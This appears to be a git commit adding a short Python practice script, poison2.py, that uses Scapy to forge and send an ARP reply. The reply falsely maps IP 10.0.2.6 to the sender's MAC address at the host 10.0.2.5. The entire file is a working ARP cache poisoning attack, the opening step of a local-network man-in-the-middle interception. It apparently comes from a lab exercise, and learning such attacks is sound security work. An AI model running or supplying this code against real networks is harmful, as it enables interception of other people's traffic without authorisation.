a480b80a523280418cd3f7d3b1c2df97855c110c
gkorpal <8099449+gkorpal@users.noreply.github.com>
2022-04-21 23:39:39 -0700

    Create poison2.py

---
+++ practice/ARP_cache_poisoning/poison2.py
@@ -0,0 +1,10 @@
+#!/usr/bin/python3
+from scapy.all import *
+
+E = Ether(src='08:00:27:af:b1:f9', dst='08:00:27:4c:f9:c5')
+A = ARP(op=2, hwsrc='08:00:27:af:b1:f9', psrc='10.0.2.6', 
+	hwdst='08:00:27:4c:f9:c5', pdst='10.0.2.5')
+
+pkt = E/A
+pkt.show()
+sendp(pkt)
